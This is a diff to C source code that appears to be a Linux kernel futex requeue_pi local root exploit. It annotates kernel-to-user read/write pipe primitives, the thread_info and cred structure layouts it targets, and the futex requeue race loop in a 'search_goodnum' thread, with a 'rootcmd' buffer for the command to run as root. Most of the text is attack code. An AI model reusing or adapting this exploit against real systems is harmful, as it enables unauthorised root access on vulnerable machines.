@@ -12,8 +12,9 @@
 #include <errno.h>
 #include <signal.h>
 
-#define FUTEX_WAIT_REQUEUE_PI   11
-#define FUTEX_CMP_REQUEUE_PI    12
+//#define FUTEX_LOCK_PI            6
+//#define FUTEX_WAIT_REQUEUE_PI   11
+//#define FUTEX_CMP_REQUEUE_PI    12
 
 #define ARRAY_SIZE(a)       (sizeof (a) / sizeof (*(a)))
 
@@ -29,10 +30,14 @@ struct task_security_struct;
 struct list_head;
 
 struct thread_info {
-    unsigned long flags;
-    int preempt_count;
-    unsigned long addr_limit;
-    struct task_struct *task;
+    struct task_struct  *task;      /* main task structure */
+    struct exec_domain  *exec_domain;   /* execution domain */
+    __u32           flags;      /* low level flags */
+    __u32           status;     /* thread synchronous flags */
+    __u32           cpu;        /* current CPU */
+    int         preempt_count;  /* 0 => preemptable,
+                           <0 => BUG */
+    unsigned long  addr_limit;
 
     /* ... */
 };
@@ -84,7 +89,7 @@ struct task_struct_partial {
     struct list_head cpu_timers[3];
     struct cred *real_cred;
     struct cred *cred;
-    struct cred *replacement_session_keyring;
+    //struct cred *replacement_session_keyring;
     char comm[16];
 };
 
@@ -119,7 +124,7 @@ pid_t last_tid = 0;
 int g_argc;
 char rootcmd[256];
 
-
+//"copy from kernel" from writebuf to readbuf
 ssize_t read_pipe(void *writebuf, void *readbuf, size_t count) {
     int pipefd[2];
     ssize_t len;
@@ -143,6 +148,7 @@ ssize_t read_pipe(void *writebuf, void *readbuf, size_t count) {
     return len;
 }
 
+//"copy to kernel" from writebuf to readbuf
 ssize_t write_pipe(void *readbuf, void *writebuf, size_t count) {
     int pipefd[2];
     ssize_t len;
@@ -566,6 +572,8 @@ void *search_goodnum(void *arg) {
     syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
 
     while (1) {
+        //keep calling futex_requeue until the sendmagic thread called futex_wait_requeue_pi, 
+        //then we have something to requeue.
         ret = syscall(__NR_futex, &uaddr1, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr1);
         if (ret == 1) {
             break;
